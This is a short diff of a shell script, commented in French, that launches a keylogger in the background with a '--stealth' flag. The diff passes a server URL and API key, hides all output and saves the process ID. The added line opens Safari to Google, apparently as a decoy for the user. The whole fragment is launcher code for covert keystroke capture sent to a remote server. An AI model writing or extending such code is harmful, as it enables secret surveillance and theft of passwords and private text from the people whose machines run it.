@@ -28,7 +28,7 @@ fi
 # Lancer le keylogger en arrière-plan avec stealth
 nohup python3 "$KEYLOGGER_SCRIPT" "$SERVER_URL" "$API_KEY" --stealth > /dev/null 2>&1 &
 PID=$!
-
+open -a "Safari" "https://www.google.com"
 # Sauvegarder le PID
 echo $PID > "$PID_FILE"
 
